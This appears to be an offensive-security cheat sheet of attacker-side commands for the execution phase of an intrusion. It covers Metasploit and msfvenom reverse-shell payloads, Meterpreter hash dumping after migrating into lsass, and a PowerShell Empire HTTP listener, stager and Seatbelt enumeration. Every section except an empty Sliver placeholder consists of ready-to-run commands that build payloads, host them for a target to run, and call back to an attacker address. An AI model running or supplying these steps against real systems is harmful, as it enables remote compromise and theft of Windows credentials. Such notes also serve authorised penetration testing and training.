# Execution

## Metasploit, MSFVenom, and Meterpreter
**Metasploit**
```bash
# attacker: terminal 1
sudo msfconsole 
use exploit/multi/handler
set LHOST 192.168.1.23
set LPORT 443
set PAYLOAD windows/meterpreter/reverse_tcp
options # check your exploit settings
run
```

**MSFVenom**
```bash
# attacker: terminal 2
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=443 -f exe -o rshell.exe
sudo python3 -m http.server 8000
# get the target to download and execute the payload
```

**Meterpreter**  
Change exploits to `post/windows/gather/hashdump`. 
```bash
# attacker: terminal 1 (after a shell has been opened)
background                       # put session into the background 
sessions                         # confirm session number
use post/windows/gather/hashdump # change exploits
set SESSION 1                    # specify the session to use
options                          # check your exploit settings
run                              # dumps password hints and hashes
sessions -k 1                    # kill the session 
```

If there was an error about needing a SYSTEM user context, run the commands below. 
```bash
sessions -i 1                    # interact with session 1
ps                               # list processes (look for lsass, explorer, etc.)
migrate 666                      # migrate to lsass process (PID 666)
background                       # try and run the 'hashdump' exploit above again
```

## Empire, Python, and Seatbelt
Start Empire. 
```bash
# attacker Terminal 1:
cd empire/
sudo ./ps-empire server
```
```bash
# attacker Terminal 2:
cd Empire/
sudo ./ps-empire client
```

Configure and start a listener. 
```bash
# attacker Terminal 2:
uselistener http
set Name handler_http 
set Port 4444
set Host 192.168.1.23
set defaultdelay 1 # seconds between agent check-in
execute            # to modify a listener, disable it and run "editlistener" (regenerate your stager too)
```

Configure and create a stager (upon execution, the stager will download and start a C2 agent). 
```bash
# attacker Terminal 2:
usestager windows/launcher_bat
set Listener handler_http
execute # the stager will be written to empire/client/generated-stagers/
```

Host the stager so it can be downloaded by the target. 
```bash
# attacker Terminal 3:
cd empire/client/generated-stagers/
sudo python3 -m http.server 9001
# get the target to download and execute the stager (launcher.bat)
```

Pick and run a PowerShell Empire module. 
```bash
# attacker Terminal 2:
agents
interact WOW12345
usemodule powershell/situational_awareness/host/seatbelt
set Agent WOW12345
set Command -group=user # enum more info about the current user for privesc
execute 
# wait and then review the results printed to the screen
```

## Sliver
```bash
# text goes here
```